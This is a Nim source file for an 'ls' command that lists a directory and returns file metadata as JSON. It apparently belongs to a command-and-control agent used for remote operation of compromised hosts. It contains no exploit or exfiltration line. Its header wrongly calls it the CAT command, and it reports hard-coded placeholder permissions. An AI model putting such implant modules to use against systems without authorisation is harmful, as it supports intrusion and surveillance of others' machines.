# This is the source for the CAT command
import ../structs
import ../utils
import json
import os
import std/times
import strutils

#[
"file_browser": {
    "host": "hostname of computer you're listing",
    "is_file": True or False,
    "permissions": {json of permission values you want to present},
    "name": "name of the file or folder you're listing",
    "parent_path": "full path of the parent folder",
    "success": True or False,
    "access_time": "string of the access time for the entity",
    "modify_time": "string of the modify time for the entity",
    "size": 1345, //size of the entity
    "update_deleted": True, //optional
    "files": [ // if this is a folder, include data on the files within
        {
            "is_file": "true or false",
            "permissions": {json of data here that you want to show},
            "name": "name of the entity",
            "access_time": "string of access time",
            "modify_time": "string of modify time",
            "size": 13567 // size of the entity
        }
    ]
}
#]#




type
  FileACL = object
    account: string
    is_inherited: bool
    rights: string
    `type`: string

  FileBaseInfo = object
    access_time: int64
    creation_date: int64
    directory: string
    extended_attributes: string
    full_name: string
    group: string
    hidden: bool
    is_file: bool
    modify_time: int64
    name: string
    owner: string
    permissions: seq[FileACL]
    size: BiggestInt

  FolderBaseInfo = object
    size: BiggestInt
    success: bool
    files: seq[FileBaseInfo]
    access_time: int64
    creation_date: int64
    host: string
    is_file: bool
    modify_time: int64
    name: string
    parent_path: string
    permissions: seq[FileACL]




#[
This will list the files of a directory

Parameter Set:
  {"host": "/home/abc", "path": "-al"}

]#
proc cmd_ls*(task: Task): seq[TaskResponse] {.cdecl.} =

  var
    params = parseJson(task.parameters)
    host = params["host"].getStr().toLowerAscii()
    path = params["path"].getStr()
    fb = false

  if "file_browser" in params:
    fb = true
    #currentHostname = getHost() # not sure if requried
  var
    startPath: string = ""
    folderInfo: FolderBaseInfo
    output: string
    status = "success"

  # resolve the path
  startPath = resolveCorrectPath(path, host)

  #[
    Return a empty structure if
    the path does not return
  ]#
  if not startPath.dirExists:
    folderInfo = FolderBaseInfo(
      access_time: 0,
      creation_date: 0,
      success: false,
      size: 0
    )
    # Create an error response
    output = $(%*folderInfo)
    return buildReturnData(task.id, output, status)

  # Workaround, as for C:\ the following functions
  # raise an error ...
  var rootLAT: int64
  var rootLCT: int64
  var rootLMT: int64
  var rootFileSize: BiggestInt

  try:
    rootLAT = getLastAccessTime(startPath).toUnix() * 1000
    rootLCT = getCreationTime(startPath).toUnix() * 1000
    rootLMT = getLastModificationTime(startPath).toUnix() * 1000
    rootFileSize = getFileSize(startPath)
  except OSError:
    discard

  try:
    folderInfo = FolderBaseInfo(
      access_time: rootLAT,
      creation_date: rootLCT,
      size: rootFileSize,
      success: true,
      host: host,
      is_file: false,
      modify_time: rootLMT,
      name: extractFilename(startPath),
      parent_path: parentDir(startPath),
      permissions: @[FileACL(
            account: "BUILTIN\\Administrators",
            is_inherited: true,
            rights: "FullControl",
            `type`: "Allow"
      )]
    )
  except OSError:
    DBG("[-] It seems that the folder does not exist(?)")
    output = "The Folder does not exist"
    return buildReturnData(task.id, output, "error")


  for fileEntry in walkDir(startPath):

    var fbi: FileBaseInfo
    try:
      fbi = FileBaseInfo(
        access_time: fileEntry.path.getLastAccessTime.toUnix() * 1000,
        creation_date: fileEntry.path.getCreationTime.toUnix() * 1000,
        directory: parentDir(fileEntry.path),
        hidden: isHidden(fileEntry.path),
        name: extractFilename(fileEntry.path),
        full_name: fileEntry.path,
        is_file: false,
        modify_time: fileEntry.path.getLastModificationTime.toUnix() * 1000,
        size: fileEntry.path.getFileSize()
      )

      # Update the `is_file` flag
      if fileEntry.kind == pcFile:
        fbi.is_file = true

      # Permissions (TBD)
      let fp = FileACL(
            account: "BUILTIN\\Administrators",
            is_inherited: true,
            rights: "FullControl",
            `type`: "Allow"
      )

      fbi.permissions.add(fp)
      folderInfo.files.add(fbi)

    except OSError:
      continue


  # return the response
  output = $(%* folderInfo)
  DBG(output)
  if fb:
    # return the special case if requested from the file browser
    return buildReturnData(task.id, output, special=SpecialCase.FileBrowser)
  else:
    return buildReturnData(task.id, output)
